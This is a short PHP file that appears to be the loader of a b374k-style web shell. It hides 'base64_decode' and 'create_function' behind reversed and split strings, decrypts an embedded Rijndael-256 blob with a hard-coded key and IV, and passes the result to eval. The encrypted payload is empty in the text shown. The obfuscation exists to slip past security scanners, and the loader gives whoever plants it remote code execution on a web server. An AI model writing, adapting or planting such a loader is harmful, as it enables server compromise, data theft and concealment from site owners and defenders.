<?php
$d1="edoc";
	 $d2="ed_46e";
	$d3="sab";
	$df=$d1.$d2.$d3;
	$r=strrev($df);
$key = '133057facf49cbe6520b15a4d96ee395';
$iv =  '58903745273487261456345245789043';
$cipher = mcrypt_module_open(MCRYPT_RIJNDAEL_256,'','cbc','');
$encrypted = "";
mcrypt_generic_init($cipher, $key, $iv);
$decrypted = mdecrypt_generic($cipher,$r($encrypted));
$s_func="cr"."eat"."e_fun"."cti"."on";
$b374k=@$s_func('$x','ev'.'al($x);');
@$b374k($decrypted);
?>